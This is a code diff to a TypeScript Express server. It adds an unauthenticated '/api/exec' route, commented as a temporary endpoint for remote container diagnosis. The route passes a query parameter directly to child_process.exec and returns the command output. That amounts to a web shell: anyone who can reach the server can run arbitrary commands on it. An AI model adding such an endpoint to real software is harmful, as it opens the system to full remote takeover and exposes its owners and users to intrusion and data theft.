@@ -78,6 +78,21 @@ app.get('/api/debug-logs', (_req: Request, res: Response) => {
   res.send(logBuffer.join('\n'));
 });
 
+// Temp exec endpoint for remote container diagnosis
+app.get('/api/exec', async (req: Request, res: Response): Promise<void> => {
+  const cmd = req.query.cmd as string;
+  if (!cmd) {
+    res.status(400).send('Missing cmd parameter');
+    return;
+  }
+  
+  const { exec } = require('child_process');
+  exec(cmd, (err: any, stdout: string, stderr: string) => {
+    res.setHeader('Content-Type', 'text/plain');
+    res.send(`--- ERROR ---\n${err ? err.message : 'None'}\n\n--- STDOUT ---\n${stdout}\n\n--- STDERR ---\n${stderr}`);
+  });
+});
+
 // Mount conversion routes
 app.use(convertRouter);
 
